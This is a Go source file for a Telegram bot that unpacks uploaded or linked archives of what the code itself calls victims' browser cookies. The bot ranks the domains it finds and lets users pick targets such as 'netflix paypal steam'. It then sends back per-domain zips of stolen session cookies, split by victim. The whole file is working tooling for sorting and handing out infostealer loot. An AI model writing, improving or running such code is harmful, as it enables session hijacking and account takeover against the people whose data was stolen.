package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	neturl "net/url"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/amarnathcjd/gogram/telegram"
)

// extractSem caps concurrent heavy archive extractions to keep RAM bounded
// across multiple users hitting the bot at the same time.
var extractSem = make(chan struct{}, 2)

const (
	DOMAINS_PER_PAGE = 16
	SESSION_TTL      = 30 * time.Minute
)

type SessionState string

const (
	StateDownloading      SessionState = "downloading"
	StateAwaitingParts    SessionState = "awaiting_parts"
	StateAwaitingPassword SessionState = "awaiting_password"
	StateSelecting        SessionState = "selecting"
	StateAwaitingSearch   SessionState = "awaiting_search"
	StateAwaitingCustom   SessionState = "awaiting_custom"
	StateDone             SessionState = "done"
)

type Session struct {
	mu sync.Mutex

	ID            string
	ChatID        int64
	UserID        int64
	JobDir        string
	ArchivePath   string
	ArchiveName   string
	InitialFilter string
	Password      string

	State         SessionState
	StatusMsgID   int
	SelectorMsgID int

	SpoolPath     string
	Stats         Stats
	DomainList    []string
	DomainCounts  map[string]int
	Selected      map[string]bool
	CustomDomains []string
	SearchFilter  string
	CurrentPage   int

	DownloadInfo *DownloadResult
	Created      time.Time
}

var sessions sync.Map   // sessionID -> *Session
var chatActive sync.Map // chatID -> sessionID (active session per chat)

func newSessionID() string {
	b := make([]byte, 4)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func startSession(chatID, userID int64, archiveName, initialFilter string) *Session {
	if old, ok := chatActive.Load(chatID); ok {
		if s, ok := sessions.Load(old.(string)); ok {
			cleanupSession(s.(*Session))
		}
	}
	jobDir, _ := os.MkdirTemp(workRoot(), "job-*")
	s := &Session{
		ID:            newSessionID(),
		ChatID:        chatID,
		UserID:        userID,
		JobDir:        jobDir,
		ArchiveName:   archiveName,
		InitialFilter: initialFilter,
		State:         StateDownloading,
		Selected:      map[string]bool{},
		Created:       time.Now(),
	}
	sessions.Store(s.ID, s)
	chatActive.Store(chatID, s.ID)
	return s
}

func getActiveSessionByChat(chatID int64) *Session {
	id, ok := chatActive.Load(chatID)
	if !ok {
		return nil
	}
	v, ok := sessions.Load(id.(string))
	if !ok {
		return nil
	}
	return v.(*Session)
}

func getSession(id string) *Session {
	v, ok := sessions.Load(id)
	if !ok {
		return nil
	}
	return v.(*Session)
}

func cleanupSession(s *Session) {
	if s == nil {
		return
	}
	if s.JobDir != "" {
		os.RemoveAll(s.JobDir)
	}
	sessions.Delete(s.ID)
	if id, ok := chatActive.Load(s.ChatID); ok && id.(string) == s.ID {
		chatActive.Delete(s.ChatID)
	}
}

func sessionsJanitor() {
	t := time.NewTicker(2 * time.Minute)
	defer t.Stop()
	for range t.C {
		sessions.Range(func(k, v any) bool {
			s := v.(*Session)
			if time.Since(s.Created) > SESSION_TTL {
				cleanupSession(s)
			}
			return true
		})
	}
}

func runArchiveExtraction(s *Session) error {
	extractSem <- struct{}{}
	defer func() { <-extractSem }()

	spoolPath := filepath.Join(s.JobDir, "cookies.spool")
	spool, err := NewSpool(spoolPath)
	if err != nil {
		return err
	}
	archivePath := s.ArchivePath
	if strings.HasSuffix(strings.ToLower(archivePath), ".rar") || isRarContinuationExt(filepath.Ext(strings.ToLower(archivePath))) {
		resolved, err := resolveRarOpenPath(s.JobDir)
		if err != nil {
			return err
		}
		archivePath = resolved
	}

	perr := processArchiveSpool(archivePath, s.InitialFilter, s.Password, 0, spool)
	closeErr := spool.Close()
	if perr != nil {
		return perr
	}
	if closeErr != nil {
		return closeErr
	}
	stats := spool.Stats()
	spool.FreeSeen()

	doms := make([]string, 0, len(stats.DomainCounts))
	for d := range stats.DomainCounts {
		doms = append(doms, d)
	}
	sort.Slice(doms, func(i, j int) bool {
		if stats.DomainCounts[doms[i]] != stats.DomainCounts[doms[j]] {
			return stats.DomainCounts[doms[i]] > stats.DomainCounts[doms[j]]
		}
		return doms[i] < doms[j]
	})

	s.mu.Lock()
	s.SpoolPath = spoolPath
	s.Stats = stats
	s.DomainCounts = stats.DomainCounts
	s.DomainList = doms
	s.mu.Unlock()

	removeArchiveFiles(s.JobDir)
	s.ArchivePath = ""
	return nil
}

func showDomainSelector(bot *Bot, s *Session) {
	s.mu.Lock()
	topDoms := s.DomainList
	if len(topDoms) > 8 {
		topDoms = topDoms[:8]
	}
	var topPreview []string
	for _, d := range topDoms {
		topPreview = append(topPreview, fmt.Sprintf("• `%s` (`%s`)", escapeMd(d), commafy(s.DomainCounts[d])))
	}
	archName := s.ArchiveName
	totalCookies := s.Stats.UniqueCookies
	totalDomains := len(s.DomainList)
	s.mu.Unlock()

	var b strings.Builder
	fmt.Fprintf(&b, "✅ *%s*\n", escapeMd(archName))
	fmt.Fprintf(&b, "`%s` cookies · `%s` domains\n", commafy(totalCookies), commafy(totalDomains))
	if len(topPreview) > 0 {
		b.WriteString("\n*top domains:*\n")
		b.WriteString(strings.Join(topPreview, "\n"))
		b.WriteString("\n")
	}
	b.WriteString("\n*what to extract?*\n")
	b.WriteString("type domains, e.g. `netflix paypal steam` — or tap below")

	kb := inlineKeyboard(
		[]telegram.KeyboardButton{cbBtn("📥 extract all", "qa:"+s.ID), cbBtn("🔝 top 50", "qt:"+s.ID)},
		[]telegram.KeyboardButton{cbBtn("🔍 browse domains", "browse:"+s.ID), cbBtn("❌ cancel", "c:"+s.ID)},
	)

	sent, err := bot.SendTextWithKeyboard(s.ChatID, b.String(), kb)
	if err != nil {
		return
	}
	s.mu.Lock()
	s.SelectorMsgID = int(sent.ID)
	s.State = StateAwaitingCustom
	s.mu.Unlock()
}

func redrawSelector(bot *Bot, s *Session) {
	if s.SelectorMsgID == 0 {
		return
	}
	text := selectorText(s)
	kb := buildKeyboard(s)
	bot.EditTextWithKeyboard(s.ChatID, s.SelectorMsgID, text, kb)
}

func filteredDomains(s *Session) []string {
	if s.SearchFilter == "" {
		return s.DomainList
	}
	q := strings.ToLower(s.SearchFilter)
	var out []string
	for _, d := range s.DomainList {
		if strings.Contains(d, q) {
			out = append(out, d)
		}
	}
	return out
}

func selectorText(s *Session) string {
	s.mu.Lock()
	defer s.mu.Unlock()
	selected := 0
	cookies := 0
	for _, d := range s.DomainList {
		if s.Selected[d] {
			selected++
			cookies += s.DomainCounts[d]
		}
	}
	customCookies := 0
	for _, c := range s.CustomDomains {
		customCookies += matchCustomCount(s, c)
	}
	filtered := filteredDomains(s)
	totalPages := max(1, (len(filtered)+DOMAINS_PER_PAGE-1)/DOMAINS_PER_PAGE)
	if s.CurrentPage >= totalPages {
		s.CurrentPage = totalPages - 1
	}

	var b strings.Builder
	fmt.Fprintf(&b, "📦 *%s*\n", escapeMd(s.ArchiveName))
	fmt.Fprintf(&b, "`%s` cookies · `%d` domains\n\n", commafy(s.Stats.UniqueCookies), len(s.DomainList))
	if selected > 0 || len(s.CustomDomains) > 0 {
		fmt.Fprintf(&b, "✅ *selected:* `%d` domains · `%s` cookies\n", selected, commafy(cookies))
	}
	if len(s.CustomDomains) > 0 {
		fmt.Fprintf(&b, "➕ *custom:* `%s` (+`%s` cookies)\n",
			escapeMd(strings.Join(s.CustomDomains, ", ")), commafy(customCookies))
	}
	if s.SearchFilter != "" {
		fmt.Fprintf(&b, "🔍 *filter:* `%s` · `%d` match(es)\n", escapeMd(s.SearchFilter), len(filtered))
	}
	fmt.Fprintf(&b, "📄 page `%d / %d`", s.CurrentPage+1, totalPages)
	return b.String()
}

func matchCustomCount(s *Session, sub string) int {
	sub = strings.ToLower(sub)
	n := 0
	for d, c := range s.DomainCounts {
		if strings.Contains(d, sub) && !s.Selected[d] {
			n += c
		}
	}
	return n
}

func escapeMd(s string) string {
	r := strings.NewReplacer("_", "\\_", "*", "\\*", "`", "\\`", "[", "\\[")
	return r.Replace(s)
}

func commafy(n int) string {
	if n < 1000 {
		return fmt.Sprintf("%d", n)
	}
	s := fmt.Sprintf("%d", n)
	var b strings.Builder
	for i, c := range s {
		if i > 0 && (len(s)-i)%3 == 0 {
			b.WriteByte(',')
		}
		b.WriteRune(c)
	}
	return b.String()
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func buildKeyboard(s *Session) telegram.ReplyMarkup {
	s.mu.Lock()
	defer s.mu.Unlock()

	filtered := filteredDomains(s)
	totalPages := max(1, (len(filtered)+DOMAINS_PER_PAGE-1)/DOMAINS_PER_PAGE)
	if s.CurrentPage >= totalPages {
		s.CurrentPage = totalPages - 1
	}
	if s.CurrentPage < 0 {
		s.CurrentPage = 0
	}
	start := s.CurrentPage * DOMAINS_PER_PAGE
	end := start + DOMAINS_PER_PAGE
	if end > len(filtered) {
		end = len(filtered)
	}
	page := filtered[start:end]

	domIdx := map[string]int{}
	for i, d := range s.DomainList {
		domIdx[d] = i
	}

	// Count selected cookies for the extract button label.
	selectedCookies := 0
	for d, sel := range s.Selected {
		if sel {
			selectedCookies += s.DomainCounts[d]
		}
	}

	var rows [][]telegram.KeyboardButton
	for i := 0; i < len(page); i += 2 {
		var row []telegram.KeyboardButton
		for j := i; j < i+2 && j < len(page); j++ {
			d := page[j]
			mark := "◻"
			if s.Selected[d] {
				mark = "✅"
			}
			label := fmt.Sprintf("%s %s (%s)", mark, truncate(d, 18), commafy(s.DomainCounts[d]))
			row = append(row, cbBtn(label, "t:"+s.ID+":"+itoa(domIdx[d])))
		}
		rows = append(rows, row)
	}

	if totalPages > 1 {
		rows = append(rows, []telegram.KeyboardButton{
			cbBtn("◀️", "pp:"+s.ID),
			cbBtn(fmt.Sprintf("%d / %d", s.CurrentPage+1, totalPages), "noop:"+s.ID),
			cbBtn("▶️", "pn:"+s.ID),
		})
	}

	searchLabel := "🔍 search"
	if s.SearchFilter != "" {
		searchLabel = "🔍 " + truncate(s.SearchFilter, 10) + " ✕"
	}
	rows = append(rows, []telegram.KeyboardButton{
		cbBtn(searchLabel, "s:"+s.ID),
		cbBtn("➕ custom", "cd:"+s.ID),
	})
	rows = append(rows, []telegram.KeyboardButton{
		cbBtn("☑️ all", "a:"+s.ID),
		cbBtn("⬜ clear", "n:"+s.ID),
		cbBtn("🔀 invert", "inv:"+s.ID),
	})

	extractLabel := "📤 extract"
	if selectedCookies > 0 {
		extractLabel = fmt.Sprintf("📤 extract (%s)", commafy(selectedCookies))
	}
	rows = append(rows, []telegram.KeyboardButton{
		cbBtn(extractLabel, "g:"+s.ID),
		cbBtn("❌ cancel", "c:"+s.ID),
	})
	return inlineKeyboard(rows...)
}

func handleCallback(bot *Bot, cq *telegram.CallbackQuery) {
	parts := strings.SplitN(cq.DataString(), ":", 3)
	if len(parts) < 2 {
		return
	}
	action := parts[0]
	sid := parts[1]
	s := getSession(sid)
	if s == nil {
		bot.AnswerCallback(cq, "session expired")
		return
	}
	if cq.GetSenderID() != s.UserID {
		bot.AnswerCallback(cq, "not your session")
		return
	}

	switch action {
	case "qa":
		s.mu.Lock()
		for _, d := range s.DomainList {
			s.Selected[d] = true
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "packing all…")
		generateAndSend(bot, s)
		return
	case "qt":
		s.mu.Lock()
		n := 50
		if n > len(s.DomainList) {
			n = len(s.DomainList)
		}
		for _, d := range s.DomainList[:n] {
			s.Selected[d] = true
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "packing top 50…")
		generateAndSend(bot, s)
		return
	case "browse":
		bot.AnswerCallback(cq, "")
		s.mu.Lock()
		s.State = StateSelecting
		s.mu.Unlock()
		// Delete the quick-action message and show the full paginated selector.
		if s.SelectorMsgID != 0 {
			bot.DeleteMessage(s.ChatID, s.SelectorMsgID)
			s.mu.Lock()
			s.SelectorMsgID = 0
			s.mu.Unlock()
		}
		text := selectorText(s)
		kb := buildKeyboard(s)
		sent, err := bot.SendTextWithKeyboard(s.ChatID, text, kb)
		if err == nil {
			s.mu.Lock()
			s.SelectorMsgID = int(sent.ID)
			s.mu.Unlock()
		}
		return
	case "noop":
		bot.AnswerCallback(cq, "")
	case "t":
		if len(parts) < 3 {
			return
		}
		idx := atoi(parts[2])
		s.mu.Lock()
		if idx >= 0 && idx < len(s.DomainList) {
			d := s.DomainList[idx]
			s.Selected[d] = !s.Selected[d]
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "")
		redrawSelector(bot, s)
	case "pn":
		s.mu.Lock()
		s.CurrentPage++
		s.mu.Unlock()
		bot.AnswerCallback(cq, "")
		redrawSelector(bot, s)
	case "pp":
		s.mu.Lock()
		if s.CurrentPage > 0 {
			s.CurrentPage--
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "")
		redrawSelector(bot, s)
	case "s":
		s.mu.Lock()
		if s.SearchFilter != "" {
			s.SearchFilter = ""
			s.CurrentPage = 0
			s.mu.Unlock()
			bot.AnswerCallback(cq, "search cleared")
			redrawSelector(bot, s)
			return
		}
		s.State = StateAwaitingSearch
		s.mu.Unlock()
		bot.AnswerCallback(cq, "")
		bot.SendText(s.ChatID, "🔍 type a domain substring to filter, e.g. `netflix`")
	case "cd":
		s.mu.Lock()
		s.State = StateAwaitingCustom
		s.mu.Unlock()
		bot.AnswerCallback(cq, "")
		bot.SendText(s.ChatID, "➕ type a domain or substring, e.g. `netflix.com` or `netflix`\nseparate multiple with spaces or commas")
	case "a":
		s.mu.Lock()
		for _, d := range filteredDomains(s) {
			s.Selected[d] = true
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "all selected")
		redrawSelector(bot, s)
	case "n":
		s.mu.Lock()
		for _, d := range filteredDomains(s) {
			s.Selected[d] = false
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "cleared")
		redrawSelector(bot, s)
	case "inv":
		s.mu.Lock()
		for _, d := range filteredDomains(s) {
			s.Selected[d] = !s.Selected[d]
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "inverted")
		redrawSelector(bot, s)
	case "g":
		bot.AnswerCallback(cq, "generating…")
		generateAndSend(bot, s)
	case "c":
		bot.AnswerCallback(cq, "cancelled")
		if s.SelectorMsgID != 0 {
			bot.EditPlain(s.ChatID, s.SelectorMsgID, "❌ cancelled — files cleaned up.")
		} else {
			bot.SendText(s.ChatID, "❌ cancelled — files cleaned up.")
		}
		cleanupSession(s)
	}
}

func handleSearchReply(bot *Bot, m *telegram.NewMessage, s *Session) {
	q := strings.TrimSpace(m.Text())
	bot.DeleteMessage(m.ChatID(), int(m.ID))
	s.mu.Lock()
	if strings.EqualFold(q, "clear") || q == "" {
		s.SearchFilter = ""
	} else {
		s.SearchFilter = strings.ToLower(q)
	}
	s.CurrentPage = 0
	s.State = StateSelecting
	s.mu.Unlock()
	redrawSelector(bot, s)
}

func handleCustomReply(bot *Bot, m *telegram.NewMessage, s *Session) {
	text := strings.TrimSpace(m.Text())
	low := strings.ToLower(text)
	parts := strings.FieldsFunc(text, func(r rune) bool {
		return r == ',' || r == ' ' || r == ';' || r == '\n' || r == '\t'
	})

	s.mu.Lock()
	if low == "all" || low == "*" {
		for _, d := range s.DomainList {
			s.Selected[d] = true
		}
	} else if low == "top" || strings.HasPrefix(low, "top") {
		n := 50
		fmt.Sscanf(low, "top %d", &n)
		if n > len(s.DomainList) {
			n = len(s.DomainList)
		}
		for _, d := range s.DomainList[:n] {
			s.Selected[d] = true
		}
	} else {
		for _, p := range parts {
			p = strings.ToLower(strings.TrimSpace(p))
			if p == "" {
				continue
			}
			dup := false
			for _, ex := range s.CustomDomains {
				if ex == p {
					dup = true
					break
				}
			}
			if !dup {
				s.CustomDomains = append(s.CustomDomains, p)
			}
		}
	}
	s.mu.Unlock()
	generateAndSend(bot, s)
}

func generateAndSend(bot *Bot, s *Session) {
	s.mu.Lock()
	selected := map[string]bool{}
	for k, v := range s.Selected {
		if v {
			selected[k] = true
		}
	}
	custom := append([]string(nil), s.CustomDomains...)
	for i, c := range custom {
		custom[i] = strings.ToLower(c)
	}
	spoolPath := s.SpoolPath
	jobDir := s.JobDir
	s.mu.Unlock()

	if len(selected) == 0 && len(custom) == 0 {
		bot.SendText(s.ChatID, "no domains selected")
		return
	}
	if spoolPath == "" {
		bot.SendText(s.ChatID, "spool missing — session expired")
		return
	}

	// One zip per selected exact domain + one zip per custom substring.
	// Each zip contains only that target's cookies, split per-victim inside.
	type zipJob struct {
		label    string          // shown in caption + used for zip filename
		selected map[string]bool // exact-domain match (or nil)
		custom   []string        // substring match (or nil)
	}
	var jobs []zipJob
	for d := range selected {
		jobs = append(jobs, zipJob{label: d, selected: map[string]bool{d: true}})
	}
	for _, sub := range custom {
		jobs = append(jobs, zipJob{label: sub, custom: []string{sub}})
	}
	if len(jobs) == 0 {
		bot.SendText(s.ChatID, "no domains selected")
		return
	}

	packMsg, _ := bot.SendText(s.ChatID,
		fmt.Sprintf("`[3/3]` 📦 *packing* `%d` zip(s)…", len(jobs)))

	totalAllRows := 0
	totalAllSessions := 0
	totalAllBytes := int64(0)
	sentZips := 0
	packStart := time.Now()

	for i, job := range jobs {
		zipName := safeFilename(job.label) + ".zip"
		if zipName == ".zip" {
			zipName = fmt.Sprintf("zip_%d.zip", i+1)
		}
		zipPath := filepath.Join(jobDir, zipName)

		editStatus(bot, sentFrom(packMsg), fmt.Sprintf(
			"`[3/3]` 📦 *packing* `%d/%d` · `%s`",
			i+1, len(jobs), escapeMd(job.label)))

		written, rows, err := streamFilterToZip(spoolPath, zipPath, job.selected, job.custom)
		if err != nil {
			bot.SendText(s.ChatID,
				fmt.Sprintf("❌ pack failed for `%s`: %s", escapeMd(job.label), err.Error()))
			continue
		}
		if rows == 0 {
			os.Remove(zipPath)
			continue
		}

		zipStat, _ := os.Stat(zipPath)
		zipSize := int64(0)
		if zipStat != nil {
			zipSize = zipStat.Size()
		}

		caption := fmt.Sprintf("🍪 `%s`\n📊 `%s` cookies · `%d` victim(s) · `%s`",
			escapeMd(job.label), commafy(rows), written, formatBytes(zipSize))

		if err := bot.SendDocument(s.ChatID, zipPath, caption); err != nil {
			bot.SendText(s.ChatID,
				fmt.Sprintf("❌ upload failed for `%s`: %s", escapeMd(job.label), err.Error()))
			continue
		}

		sentZips++
		totalAllRows += rows
		totalAllSessions += written
		totalAllBytes += zipSize
		os.Remove(zipPath)
	}

	packElapsed := time.Since(packStart)

	if sentZips == 0 {
		editStatus(bot, sentFrom(packMsg), "🤷 no cookies matched any selection")
		return
	}

	var b strings.Builder
	fmt.Fprintf(&b, "✅ *done* — `%s`\n", escapeMd(s.ArchiveName))
	fmt.Fprintf(&b, "📤 sent `%d` zip(s) · `%s` total\n", sentZips, formatBytes(totalAllBytes))
	fmt.Fprintf(&b, "🍪 `%s` cookies · `%d` victim-session(s)\n", commafy(totalAllRows), totalAllSessions)
	fmt.Fprintf(&b, "⏱ packed in `%s`", packElapsed.Round(time.Millisecond))
	if s.DownloadInfo != nil {
		mbps := float64(s.DownloadInfo.Bytes) / 1024 / 1024 / s.DownloadInfo.Duration.Seconds()
		fmt.Fprintf(&b, "\n⬇️ fetched `%s` in `%s` @ `%.1f MB/s` (`%dx`)",
			formatBytes(s.DownloadInfo.Bytes), s.DownloadInfo.Duration.Round(time.Second),
			mbps, s.DownloadInfo.Parallel)
	}
	editStatus(bot, sentFrom(packMsg), b.String())

	if s.SelectorMsgID != 0 {
		bot.DeleteMessage(s.ChatID, s.SelectorMsgID)
	}
	cleanupSession(s)
}

func startSessionFromFile(bot *Bot, m *telegram.NewMessage) {
	doc := m.Document()
	if doc == nil {
		return
	}
	name := docFileName(doc)
	size := doc.Size
	if size > MAX_ARCHIVE_BYTES {
		reply(bot, m, fmt.Sprintf("archive too big (%.1f GB, cap %d GB)", float64(size)/1e9, MAX_ARCHIVE_BYTES/(1024*1024*1024)))
		return
	}
	lname := strings.ToLower(name)
	if !isArchiveUploadName(lname) {
		reply(bot, m, "send a .zip or .rar archive (.r00/.r01 continuation parts are supported too)")
		return
	}

	if s := getActiveSessionByChat(m.ChatID()); s != nil && s.State == StateAwaitingParts {
		addArchivePart(bot, m, s)
		return
	}

	filter := parseFilter(m.Text())
	s := startSession(m.ChatID(), m.SenderID(), name, filter)
	destName := sanitizeArchiveFilename(name)
	s.ArchivePath = filepath.Join(s.JobDir, destName)
	statusMsg, _ := bot.SendText(s.ChatID, fmt.Sprintf(
		"`[1/3]` ⬇️ *downloading from telegram*\n%s\n`0%%`", escapeMd(name)))
	s.StatusMsgID = int(statusMsg.ID)

	prog := func(done, total int64, bps float64) {
		pct := 0.0
		if total > 0 {
			pct = float64(done) / float64(total) * 100
		}
		eta := "—"
		if bps > 1 && total > done {
			eta = fmtDuration(float64(total-done) / bps)
		}
		editStatus(bot, sentFrom(statusMsg), fmt.Sprintf(
			"`[1/3]` ⬇️ *downloading*\n📦 `%s`\n%s\n`%s / %s` · `%.1f%%`\n⚡ `%s/s` · ETA `%s`",
			escapeMd(name),
			progressBar(pct, 20),
			formatBytes(done), formatBytes(total), pct,
			formatBytes(int64(bps)), eta,
		))
	}
	if err := bot.DownloadMessage(m, s.ArchivePath, prog, MAX_ARCHIVE_BYTES); err != nil {
		editStatus(bot, sentFrom(statusMsg), "❌ download failed: "+err.Error())
		cleanupSession(s)
		return
	}

	if looksLikeMultipartRar(name) {
		s.State = StateAwaitingParts
		editStatus(bot, sentFrom(statusMsg), fmt.Sprintf(
			"📎 *part saved* `%s`\n\nsend the remaining .rar / .r00 parts, then `/done` to extract.\n`/cancel` to abort.",
			escapeMd(destName)))
		return
	}

	finishExtractAndShow(bot, s, sentFrom(statusMsg))
}

func addArchivePart(bot *Bot, m *telegram.NewMessage, s *Session) {
	doc := m.Document()
	if doc == nil {
		return
	}
	name := docFileName(doc)
	size := doc.Size
	if size > MAX_ARCHIVE_BYTES {
		reply(bot, m, fmt.Sprintf("archive too big (%.1f GB, cap %d GB)", float64(size)/1e9, MAX_ARCHIVE_BYTES/(1024*1024*1024)))
		return
	}
	lname := strings.ToLower(name)
	if !isArchiveUploadName(lname) {
		reply(bot, m, "send .rar / .r00 continuation parts, or /done when finished")
		return
	}

	destName := sanitizeArchiveFilename(name)
	destPath := filepath.Join(s.JobDir, destName)
	statusMsg := msgRef(s.ChatID, s.StatusMsgID)

	if err := bot.DownloadMessage(m, destPath, nil, MAX_ARCHIVE_BYTES); err != nil {
		editStatus(bot, statusMsg, "❌ download failed: "+err.Error())
		return
	}

	vols, _ := listRarVolumes(s.JobDir)
	editStatus(bot, statusMsg, fmt.Sprintf(
		"📎 *%d part(s) saved*\nlatest: `%s`\n\nsend more parts, then `/done` to extract.\n`/cancel` to abort.",
		len(vols), escapeMd(destName)))
}

func finishMultipartUpload(bot *Bot, m *telegram.NewMessage, s *Session) {
	openPath, err := resolveRarOpenPath(s.JobDir)
	if err != nil {
		reply(bot, m, err.Error())
		return
	}
	s.ArchivePath = openPath
	s.State = StateDownloading
	statusMsg := msgRef(s.ChatID, s.StatusMsgID)
	editStatus(bot, statusMsg, "`[2/3]` ⚙️ extracting multi-part rar…")
	finishExtractAndShow(bot, s, statusMsg)
}

func startSessionFromURL(bot *Bot, m *telegram.NewMessage, url string) {
	filter := ""
	if rest := strings.TrimSpace(strings.Replace(m.Text(), url, "", 1)); rest != "" {
		filter = parseFilter(rest)
	}
	archName := archiveNameFromURL(url)
	s := startSession(m.ChatID(), m.SenderID(), archName, filter)
	statusMsg, _ := bot.SendText(s.ChatID, fmt.Sprintf(
		"`[1/3]` 🔍 *resolving* `%s`…", escapeMd(archName)))
	s.StatusMsgID = int(statusMsg.ID)

	downloadName := sanitizeArchiveFilename(archName)
	if downloadName == "" || downloadName == "download" {
		downloadName = "archive"
	}
	s.ArchivePath = filepath.Join(s.JobDir, downloadName)

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Minute)
	defer cancel()

	lastEdit := time.Now()
	prog := func(d, total int64, bps float64) {
		if time.Since(lastEdit) < 2*time.Second {
			return
		}
		lastEdit = time.Now()
		pct := 0.0
		if total > 0 {
			pct = float64(d) / float64(total) * 100
		}
		eta := "—"
		if bps > 1 && total > d {
			etaSec := float64(total-d) / bps
			eta = fmtDuration(etaSec)
		}
		editStatus(bot, sentFrom(statusMsg), fmt.Sprintf(
			"`[1/3]` ⬇️ *downloading url* (`%dx` parallel)\n📦 `%s`\n%s\n`%s / %s` · `%.1f%%`\n⚡ `%s/s` · ETA `%s`",
			DEFAULT_PARALLEL,
			escapeMd(archName),
			progressBar(pct, 20), formatBytes(d), formatBytes(total), pct,
			formatBytes(int64(bps)), eta,
		))
	}

	res, err := parallelDownload(ctx, url, s.ArchivePath, DEFAULT_PARALLEL, MAX_ARCHIVE_BYTES_URL, prog)
	if err != nil {
		editStatus(bot, sentFrom(statusMsg), "download failed: "+err.Error())
		cleanupSession(s)
		return
	}

	ext, err := detectArchiveExt(s.ArchivePath)
	if err != nil {
		detail := res.ContentType
		if detail == "" {
			detail = "unknown content-type"
		}
		editStatus(bot, sentFrom(statusMsg), fmt.Sprintf(
			"download failed: URL returned `%s`, not a zip/rar archive.\nPaste the direct final archive URL.",
			escapeMd(detail)))
		cleanupSession(s)
		return
	}
	finalPath := filepath.Join(s.JobDir, strings.TrimSuffix(downloadName, filepath.Ext(downloadName))+ext)
	if err := os.Rename(s.ArchivePath, finalPath); err != nil {
		editStatus(bot, sentFrom(statusMsg), "download failed: "+err.Error())
		cleanupSession(s)
		return
	}
	s.ArchivePath = finalPath
	if res.FileName != "" {
		archName = res.FileName
	} else if name := archiveNameFromURL(res.FinalURL); name != "download" {
		archName = name
	}
	if archiveExtFromName(archName) == "" {
		archName += ext
	}
	s.ArchiveName = archName
	s.DownloadInfo = res
	editStatus(bot, sentFrom(statusMsg), fmt.Sprintf(
		"`[1/3]` ✅ *downloaded* `%s` in `%s` (`%dx`)\n`[2/3]` ⚙️ extracting…",
		formatBytes(res.Bytes), res.Duration.Round(time.Second), res.Parallel))
	finishExtractAndShow(bot, s, sentFrom(statusMsg))
}

func archiveNameFromURL(rawURL string) string {
	name := ""
	if u, err := neturl.Parse(rawURL); err == nil {
		name = filepath.Base(u.Path)
	}
	if name == "" || name == "." || name == "/" {
		name = "download"
	}
	if dec, err := neturl.QueryUnescape(name); err == nil {
		name = dec
	}
	return filepath.Base(name)
}

func finishExtractAndShow(bot *Bot, s *Session, statusMsg SentMsg) {
	stop := startExtractHeartbeat(bot, statusMsg)
	err := runArchiveExtraction(s)
	close(stop)
	if errors.Is(err, ErrPasswordRequired) {
		s.State = StateAwaitingPassword
		editStatus(bot, statusMsg, "🔒 *password required*\nreply with the archive password to unlock it.")
		return
	}
	if err != nil {
		editStatus(bot, statusMsg, "extract failed: "+err.Error())
		cleanupSession(s)
		return
	}
	if s.Stats.UniqueCookies == 0 {
		editStatus(bot, statusMsg, "no cookies found"+filterTag(s.InitialFilter))
		cleanupSession(s)
		return
	}
	bot.DeleteMessage(s.ChatID, int(statusMsg.MsgID))
	showDomainSelector(bot, s)
}

func handlePasswordReply(bot *Bot, m *telegram.NewMessage, s *Session) {
	pass := m.Text()
	bot.DeleteMessage(m.ChatID(), int(m.ID))
	s.Password = pass
	statusSent, _ := bot.SendText(s.ChatID, "🔓 trying password…")
	statusMsg := sentFrom(statusSent)
	stop := startExtractHeartbeat(bot, statusMsg)
	err := runArchiveExtraction(s)
	close(stop)
	if errors.Is(err, ErrBadPassword) {
		editStatus(bot, statusMsg, "❌ *wrong password* — send another one.")
		return
	}
	if errors.Is(err, ErrPasswordRequired) {
		editStatus(bot, statusMsg, "❌ *still locked* — send another password.")
		return
	}
	if err != nil {
		editStatus(bot, statusMsg, "extract failed: "+err.Error())
		cleanupSession(s)
		return
	}
	if s.Stats.UniqueCookies == 0 {
		editStatus(bot, statusMsg, "no cookies found"+filterTag(s.InitialFilter))
		cleanupSession(s)
		return
	}
	bot.DeleteMessage(s.ChatID, int(statusMsg.MsgID))
	showDomainSelector(bot, s)
}

func progressBar(pct float64, width int) string {
	if pct < 0 {
		pct = 0
	}
	if pct > 100 {
		pct = 100
	}
	filled := int(float64(width) * pct / 100)
	return "`" + strings.Repeat("▰", filled) + strings.Repeat("▱", width-filled) + "`"
}

func fmtDuration(secs float64) string {
	if secs < 60 {
		return fmt.Sprintf("%ds", int(secs))
	}
	if secs < 3600 {
		return fmt.Sprintf("%dm%02ds", int(secs)/60, int(secs)%60)
	}
	return fmt.Sprintf("%dh%02dm", int(secs)/3600, (int(secs)%3600)/60)
}

func startExtractHeartbeat(bot *Bot, statusMsg SentMsg) chan struct{} {
	stop := make(chan struct{})
	ResetExtractProgress()
	start := time.Now()
	spinner := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	go func() {
		t := time.NewTicker(2 * time.Second)
		defer t.Stop()
		i := 0
		for {
			select {
			case <-stop:
				return
			case <-t.C:
				entries, cookies := ExtractProgress()
				elapsed := time.Since(start).Seconds()
				epsRate, cpsRate := 0.0, 0.0
				if elapsed > 0 {
					epsRate = float64(entries) / elapsed
					cpsRate = float64(cookies) / elapsed
				}
				editStatus(bot, statusMsg, fmt.Sprintf(
					"`[2/3]` %s *extracting cookies*\n📂 entries: `%s` (`%s/s`)\n🍪 cookies: `%s` (`%s/s`)\n⏱ elapsed `%s`",
					spinner[i%len(spinner)],
					commafy(int(entries)), commafy(int(epsRate)),
					commafy(int(cookies)), commafy(int(cpsRate)),
					fmtDuration(elapsed),
				))
				i++
			}
		}
	}()
	return stop
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n-1] + "…"
}

func itoa(i int) string { return fmt.Sprintf("%d", i) }
func atoi(s string) int {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			return -1
		}
		n = n*10 + int(c-'0')
	}
	return n
}
